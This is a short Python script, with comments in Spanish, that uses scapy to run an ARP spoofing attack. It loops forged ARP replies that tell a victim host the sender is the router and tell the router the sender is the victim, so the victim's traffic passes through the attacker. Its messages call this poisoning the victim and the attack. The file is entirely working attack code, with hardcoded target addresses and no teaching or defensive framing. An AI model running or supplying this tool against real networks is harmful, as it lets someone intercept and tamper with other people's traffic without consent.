import scapy.all as scapy
from time import sleep


def spoof(target_ip, target_mac, spoof_ip): 
    
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
        
sent_package = 0
gateway = "192.168.1.1"
print("Envenenando victima...")
print("Envenenando router...")
try:
    while True:
        spoof("192.168.1.2", "28:87:ba:3a:d6:40" , gateway) #LE DECIMOS A LA VICTIMA QUE NOSOTROS SOMOS EL ROUTER.
        spoof("192.168.1.1", "54:46:17:ab:32:60", "192.168.1.2") #LE DECIMOS AL ROUTER QUE NOSOTROS SOMOS LA VICTIMA, PARA QUE NOS DE UNA RESPUESTA DE LOS PAQUETES QUE ENVIA LA VICTIMA.
        sent_package = sent_package + 2
        print("\r[+] Paquetes enviados: " + str(sent_package), end=" ")
        sleep(2)
except KeyboardInterrupt:
    print("\n[-] Deteniendo ataque...")

"""192.168.0.104", "00:26:6c:e3:73:18", "192.168.0.1"""